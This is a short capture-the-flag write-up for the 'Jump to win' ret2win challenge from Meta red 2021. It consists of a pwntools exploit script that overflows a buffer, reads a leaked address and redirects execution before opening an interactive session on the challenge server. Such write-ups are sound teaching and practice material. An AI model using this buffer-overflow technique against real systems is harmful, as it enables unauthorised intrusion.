---
title: pwn Jump to win
description: your description goes here
author:
  name: jopraveen
  link: https://github.com/jopraveen
date: 2021-12-18
categories: [CTFtime,Meta red 2021]
tags: [ret2win,python,pwntools,pwn]
math: true
mermaid: true
---

# JUMP_TO_WIN

#### Exploit script

```python
from pwn import *

elf = context.binary = ELF('./jump_to_win')

p = elf.process()
p = remote('ctf-metared-2021.ua.pt',26656)

p.recv()
payload = b'A'*64
payload += p64(0x4155)
p.sendline(payload)
vuln_addd = int((p.recv().decode('latin-1').split()[-8]),16)

payload = b'A'*40
payload += p64(vuln_addd)
payload += p64(vuln_addd)

p.sendline(payload)
p.interactive()
```